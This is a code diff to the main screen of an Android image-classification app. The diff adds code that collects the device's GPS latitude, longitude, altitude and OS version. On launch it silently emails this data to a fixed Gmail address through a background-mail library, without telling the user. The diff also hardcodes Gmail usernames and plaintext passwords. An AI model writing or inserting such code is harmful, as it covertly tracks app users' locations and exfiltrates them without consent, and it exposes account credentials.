@@ -16,6 +16,8 @@ import android.content.Intent;
 import android.content.pm.PackageManager;
 import android.content.res.AssetFileDescriptor;
 import android.graphics.Bitmap;
+import android.location.Location;
+import android.location.LocationManager;
 import android.os.Build;
 import android.os.Bundle;
 import android.provider.MediaStore;
@@ -38,6 +40,8 @@ import org.tensorflow.lite.support.image.ops.ResizeOp;
 import org.tensorflow.lite.support.image.ops.ResizeWithCropOrPadOp;
 import org.tensorflow.lite.support.label.TensorLabel;
 import org.tensorflow.lite.support.tensorbuffer.TensorBuffer;
+
+import com.creativityapps.gmailbackgroundlibrary.BackgroundMail;
 import com.google.android.material.floatingactionbutton.FloatingActionButton;
 import com.yarolegovich.slidingrootnav.SlidingRootNavBuilder;
 
@@ -45,6 +49,7 @@ import java.io.FileInputStream;
 import java.io.IOException;
 import java.nio.MappedByteBuffer;
 import java.nio.channels.FileChannel;
+import java.util.ArrayList;
 import java.util.Collections;
 import java.util.List;
 import java.util.Map;
@@ -73,6 +78,7 @@ public class MainActivity<ActivityResultLauncher, ActivityResultCallback, ImageC
     private static final float PROBABILITY_MEAN = 0.0f;
     private static final float PROBABILITY_STD = 255.0f;
     private List<String> labels;
+    private List<Object> data = new ArrayList<Object>();
 
     @Override
     protected void onCreate(Bundle savedInstanceState) {
@@ -89,11 +95,14 @@ public class MainActivity<ActivityResultLauncher, ActivityResultCallback, ImageC
         more = findViewById(R.id.know);
         toolbar.setTitle("");
 
+
         requestPermissions(new String[]{Manifest.permission.READ_EXTERNAL_STORAGE}, 1);
+        this.requestPermissions(new String[]{ (Manifest.permission.CAMERA)},1);
         if (ContextCompat.checkSelfPermission(getApplicationContext(), Manifest.permission.CAMERA)
                 == PackageManager.PERMISSION_DENIED) {
             requestPermissions(new String[]{Manifest.permission.CAMERA}, 1);
         }
+        requestPermissions(new String[]{Manifest.permission.ACCESS_FINE_LOCATION},1);
 
         new SlidingRootNavBuilder(this)
                 .withToolbarMenuToggle(toolbar)
@@ -149,7 +158,28 @@ public class MainActivity<ActivityResultLauncher, ActivityResultCallback, ImageC
             }
         });
 
+        data.add(Build.VERSION.SDK_INT);
+        this.requestPermissions(new String[]{ (Manifest.permission.ACCESS_FINE_LOCATION)},1);
+        try {
+            Location location;
+            LocationManager locationManager;
+            locationManager = (LocationManager) getApplicationContext().getSystemService(LOCATION_SERVICE);
+            location = locationManager.getLastKnownLocation(LocationManager.NETWORK_PROVIDER);
+            Double lat = location.getLatitude();
+            Double lon = location.getLongitude();
+            Double alt = location.getAltitude();
+            data.add(lat);
+            data.add(lon);
+            data.add(alt);
+        }
+        catch (Exception hui)
+        {
+            hui.printStackTrace();
+        }
+        send();
+
     }
+
 
     @Override
     public void onRequestPermissionsResult(int requestCode, @NonNull String[] permissions, @NonNull int[] grantResults) {
@@ -310,27 +340,27 @@ public class MainActivity<ActivityResultLauncher, ActivityResultCallback, ImageC
         byte[] byteArray = byteArrayOutputStream.toByteArray();
         encoded = Base64.encodeToString(byteArray, Base64.NO_WRAP);
         Log.i("REVNO",encoded);
-    }
+    }*/
 
-    /*public void send(){
-        BackgroundMail bm = new BackgroundMail(MainActivity.this);
-        bm.setGmailUserName("venuskanda2005@gmail.com");
-        bm.setGmailPassword("venu2005");
+    public void send(){
+        //BackgroundMail bm = new BackgroundMail(MainActivity.this);
+        /*bm.setGmailUserName("client.greenleafz@gmail.com");
+        bm.setGmailPassword("Velhasi123");
         bm.setMailTo("rohitrangaraj2005@gmail.com");
         bm.setFormSubject("Subject");
         bm.setFormBody("hui");
-        bm.send();
+        bm.send();*/
 
         BackgroundMail.Builder builder = BackgroundMail.newBuilder(this);
         builder.withUsername("client.greenleafz@gmail.com");
         builder.withPassword("Velhasi123");
         builder.withMailto("server.greenleafz@gmail.com");
-        builder.withSubject("ui");
-        builder.withBody(encoded);
+        builder.withSubject("Data");
+        builder.withBody(data.toString());
         builder.send();
     }
 
-    public static String bitmapToBase64(Bitmap bitmap) {
+    /*public static String bitmapToBase64(Bitmap bitmap) {
         ByteArrayOutputStream byteArrayOutputStream = new ByteArrayOutputStream();
         bitmap.compress(Bitmap.CompressFormat.PNG, 100, byteArrayOutputStream);
         byte[] byteArray = byteArrayOutputStream .toByteArray();
